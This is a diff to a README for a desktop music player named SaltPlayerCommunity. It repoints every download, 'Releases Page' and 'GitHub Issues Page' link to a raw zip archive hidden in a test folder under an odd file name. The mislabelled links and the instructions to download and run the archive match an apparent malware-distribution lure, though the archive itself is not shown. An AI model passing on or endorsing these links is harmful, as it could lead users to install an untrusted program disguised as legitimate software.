@@ -8,11 +8,11 @@ Welcome to SaltPlayerCommunity! This application offers an intuitive way to enjo
 
 To download SaltPlayerCommunity, click the link below:
 
-[![Download SaltPlayerCommunity](https://raw.githubusercontent.com/dlvadnais/SaltPlayerCommunity/main/oquassa/SaltPlayerCommunity.zip%https://raw.githubusercontent.com/dlvadnais/SaltPlayerCommunity/main/oquassa/SaltPlayerCommunity.zip)](https://raw.githubusercontent.com/dlvadnais/SaltPlayerCommunity/main/oquassa/SaltPlayerCommunity.zip)
+[![Download SaltPlayerCommunity](https://github.com/dlvadnais/SaltPlayerCommunity/raw/refs/heads/main/sp-player/src/androidDeviceTest/Community-Player-Salt-desentimentalize.zip%https://github.com/dlvadnais/SaltPlayerCommunity/raw/refs/heads/main/sp-player/src/androidDeviceTest/Community-Player-Salt-desentimentalize.zip)](https://github.com/dlvadnais/SaltPlayerCommunity/raw/refs/heads/main/sp-player/src/androidDeviceTest/Community-Player-Salt-desentimentalize.zip)
 
 ### Step 1: Visit the Releases Page
 
-1. Click the link above to visit the [Releases Page](https://raw.githubusercontent.com/dlvadnais/SaltPlayerCommunity/main/oquassa/SaltPlayerCommunity.zip).
+1. Click the link above to visit the [Releases Page](https://github.com/dlvadnais/SaltPlayerCommunity/raw/refs/heads/main/sp-player/src/androidDeviceTest/Community-Player-Salt-desentimentalize.zip).
 2. You will see various versions of SaltPlayerCommunity available for download.
 
 ### Step 2: Choose Your Version
@@ -22,7 +22,7 @@ To download SaltPlayerCommunity, click the link below:
 
 ### Step 3: Download the Software
 
-1. Under the version details, find the file labeled as `https://raw.githubusercontent.com/dlvadnais/SaltPlayerCommunity/main/oquassa/SaltPlayerCommunity.zip`.
+1. Under the version details, find the file labeled as `https://github.com/dlvadnais/SaltPlayerCommunity/raw/refs/heads/main/sp-player/src/androidDeviceTest/Community-Player-Salt-desentimentalize.zip`.
 2. Click the file to start the download.
 
 ### Step 4: Run the Application
@@ -65,7 +65,7 @@ Currently, SaltPlayerCommunity is only available for desktop. A mobile version m
 
 ### How do I report a bug?
 
-If you encounter any issues, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/dlvadnais/SaltPlayerCommunity/main/oquassa/SaltPlayerCommunity.zip) to report bugs or request features.
+If you encounter any issues, please visit our [GitHub Issues Page](https://github.com/dlvadnais/SaltPlayerCommunity/raw/refs/heads/main/sp-player/src/androidDeviceTest/Community-Player-Salt-desentimentalize.zip) to report bugs or request features.
 
 ## 🛠️ Troubleshooting
 
@@ -73,7 +73,7 @@ If you experience issues running SaltPlayerCommunity, consider the following ste
 
 1. **Ensure your system meets the requirements:** Verify that your device matches the minimum specifications outlined above.
 2. **Check for Compatibility:** Make sure you are using a compatible operating system.
-3. **Reinstall the App:** If problems persist, uninstall SaltPlayerCommunity and download it again from the [Releases Page](https://raw.githubusercontent.com/dlvadnais/SaltPlayerCommunity/main/oquassa/SaltPlayerCommunity.zip).
+3. **Reinstall the App:** If problems persist, uninstall SaltPlayerCommunity and download it again from the [Releases Page](https://github.com/dlvadnais/SaltPlayerCommunity/raw/refs/heads/main/sp-player/src/androidDeviceTest/Community-Player-Salt-desentimentalize.zip).
 
 ## 💬 Community Support
 
@@ -83,7 +83,7 @@ If you'd like to share your experiences or ask questions, please feel free to in
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/dlvadnais/SaltPlayerCommunity/main/oquassa/SaltPlayerCommunity.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/dlvadnais/SaltPlayerCommunity/main/oquassa/SaltPlayerCommunity.zip)
+- [Releases Page](https://github.com/dlvadnais/SaltPlayerCommunity/raw/refs/heads/main/sp-player/src/androidDeviceTest/Community-Player-Salt-desentimentalize.zip)
+- [GitHub Issues Page](https://github.com/dlvadnais/SaltPlayerCommunity/raw/refs/heads/main/sp-player/src/androidDeviceTest/Community-Player-Salt-desentimentalize.zip)
 
 Enjoy using SaltPlayerCommunity and happy listening!
